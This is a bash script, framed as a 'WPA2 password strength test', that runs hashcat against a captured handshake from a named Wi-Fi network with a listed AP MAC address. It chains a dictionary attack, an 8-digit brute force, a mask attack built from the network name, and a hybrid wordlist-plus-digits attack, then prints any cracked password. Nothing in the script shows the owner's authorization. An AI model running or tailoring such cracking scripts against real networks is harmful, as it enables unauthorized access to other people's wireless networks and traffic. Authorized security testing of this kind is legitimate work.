#!/bin/bash

echo "========================================"
echo "WPA2 PASSWORD STRENGTH TESTING"
echo "========================================"
echo ""
echo "Network: Abooo bader"
echo "AP MAC: f4:e5:f2:65:cf:08"
echo "Hash Mode: 22000 (WPA-PBKDF2-PMKID+EAPOL)"
echo ""

# Test 1: Dictionary Attack with Test Wordlist
echo "=== Test 1: Dictionary Attack (Small Wordlist) ==="
hashcat -m 22000 wpa2_hash.hccapx test_wordlist.txt --force --quiet --status --status-timer=5 2>/dev/null
echo "Status: Completed"
echo ""

# Test 2: Brute Force Attack (8-10 digits)
echo "=== Test 2: Brute Force Attack (8 digits) ==="
echo "Testing pattern: ?d?d?d?d?d?d?d?d (8 digits)"
timeout 30 hashcat -m 22000 wpa2_hash.hccapx -a 3 ?d?d?d?d?d?d?d?d --force --quiet --status --status-timer=5 2>/dev/null || echo "Timeout - taking too long"
echo ""

# Test 3: Mask Attack (Common patterns)
echo "=== Test 3: Mask Attack (Common Patterns) ==="
echo "Testing pattern: Abooo?d?d?d?d (Abooo + 4 digits)"
hashcat -m 22000 wpa2_hash.hccapx -a 3 "Abooo?d?d?d?d" --force --quiet 2>/dev/null
echo "Status: Completed"
echo ""

# Test 4: Hybrid Attack
echo "=== Test 4: Hybrid Attack (Wordlist + Numbers) ==="
echo "Appending 2 digits to wordlist entries"
hashcat -m 22000 wpa2_hash.hccapx -a 6 test_wordlist.txt ?d?d --force --quiet 2>/dev/null
echo "Status: Completed"
echo ""

# Check if password was cracked
echo "=== Checking Results ==="
if hashcat -m 22000 wpa2_hash.hccapx --show 2>/dev/null | grep -q ":"; then
    echo "✓ PASSWORD CRACKED!"
    echo "Cracked password:"
    hashcat -m 22000 wpa2_hash.hccapx --show 2>/dev/null
else
    echo "✗ Password not cracked with current attacks"
fi

echo ""
echo "========================================"
echo "SECURITY ASSESSMENT"
echo "========================================"
